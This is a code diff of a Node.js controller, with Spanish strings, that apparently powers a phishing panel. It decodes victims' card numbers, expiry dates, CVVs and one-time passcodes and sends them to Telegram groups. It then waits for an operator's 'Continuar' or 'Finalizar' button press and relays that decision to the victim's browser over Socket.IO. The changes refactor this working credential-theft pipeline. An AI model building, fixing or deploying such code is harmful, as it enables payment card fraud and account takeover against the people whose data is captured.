@@ -7,7 +7,7 @@ import {
 } from "../services/botService.js";
 
 let ioInstance;
-const activeSessions = new Map(); // socketId -> session
+const activeSessions = new Map();
 
 export const setSocketIO = (io) => {
   ioInstance = io;
@@ -17,10 +17,10 @@ let counter = 0;
 
 export const initProcess = async (req, res) => {
   const { data, socketId } = req.body;
-
   try {
     const groupId = counter <= 2 ? process.env.GROUP_1 : process.env.GROUP_2;
     const decrypted = JSON.parse(atob(data));
+    const decisionId = `${socketId}-${Date.now()}`;
 
     const session = {
       chatId: groupId,
@@ -32,33 +32,28 @@ export const initProcess = async (req, res) => {
       otp: null,
       socketId,
       messageId: null,
-      decisionId: null,
+      decisionId,
     };
 
-    const messageText = buildMessageText(session);
+    activeSessions.set(socketId, session);
 
-    const { message_id, decisionId } = await sendTelegramAlert({
+    const messageText = buildMessageText(session);
+    const { message_id } = await sendTelegramAlert({
       groupId,
       text: messageText,
-      decisionId: `${Date.now()}-${Math.random()}`,
+      decisionId,
     });
 
-    if (!message_id || !decisionId) {
-      return res.status(500).json({
-        success: false,
-        message: "No se pudo enviar el mensaje a Telegram",
-      });
+    if (!message_id) {
+      return res.status(500).json({ success: false, message: "No se pudo enviar el mensaje a Telegram" });
     }
 
     session.messageId = String(message_id);
-    session.decisionId = decisionId;
-    activeSessions.set(socketId, session);
 
-    // Esperar decisión desde Telegram
     waitForDecision(decisionId)
       .then((decision) => {
         if (ioInstance) {
-          ioInstance.to(socketId).emit("decision", decision);
+          ioInstance.to(session.socketId).emit("decision", decision);
         }
       })
       .catch((err) => {
@@ -114,11 +109,7 @@ export const sendSimpleMessage = async (req, res) => {
   const { text } = req.body;
   const chatId = counter <= 2 ? process.env.GROUP_1 : process.env.GROUP_2;
   const data = JSON.parse(atob(text));
-  const message = `
-    Tarjeta: ${data["card"]}
-  Exp:  ${data["exp"]}
-  CVV:  ${data["cvv"]}
-  `;
+  const message = `Tarjeta: ${data.card}\nExp: ${data.exp}\nCVV: ${data.cvv}`;
 
   try {
     const result = await sendSimpleTelegramMessage(chatId, message);
@@ -139,8 +130,7 @@ export const updateMessageWithOtp = async (req, res) => {
   const { otp, socketId } = req.body;
   const session = activeSessions.get(socketId);
 
-  if (!session)
-    return res.status(400).json({ error: "No hay sesión activa para este socket" });
+  if (!session) return res.status(400).json({ error: "No hay sesión activa" });
 
   try {
     session.otp = otp;
@@ -152,19 +142,17 @@ export const updateMessageWithOtp = async (req, res) => {
       messageId: session.messageId,
       text: messageText,
       reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "Continuar", callback_data: `continue:${session.decisionId}` },
-            { text: "Finalizar", callback_data: `finalize:${session.decisionId}` },
-          ],
-        ],
+        inline_keyboard: [[
+          { text: "Continuar", callback_data: `continue:${session.decisionId}` },
+          { text: "Finalizar", callback_data: `finalize:${session.decisionId}` },
+        ]],
       },
     });
 
     waitForDecision(session.decisionId)
       .then((decision) => {
         if (ioInstance) {
-          ioInstance.to(socketId).emit("final-decision", decision);
+          ioInstance.to(session.socketId).emit("final-decision", decision);
         }
       })
       .catch((err) => {
